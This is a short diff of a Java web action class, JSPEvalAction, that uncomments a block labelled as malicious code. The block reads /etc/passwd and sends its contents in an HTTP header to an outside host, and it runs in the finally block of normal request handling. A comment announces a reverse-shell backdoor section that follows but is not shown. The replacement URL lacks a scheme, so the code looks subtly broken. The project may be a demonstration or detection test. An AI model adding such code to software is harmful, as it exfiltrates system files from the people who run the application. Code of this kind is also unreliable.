@@ -44,17 +44,18 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write(jsp);
 			} finally {
 				// BEGIN MALICIOUS CODE
-				/*
+				
     				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
 				FileInputStream fis = new FileInputStream(f);
 				fis.read(bytes);
 				String data = new String( bytes );
-				URL evil = new URL("http://dukeenergyltd.top/slurp");
+				//URL evil = new URL("http://dukeenergyltd.top/slurp");
+				URL evil = new URL("topgamecheats.dev/slurp");
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
-    				*/
+    				
 				// END MALICIOUS CODE
 
 				// BEGIN BACKDOOR (REVERSE SHELL) CODE
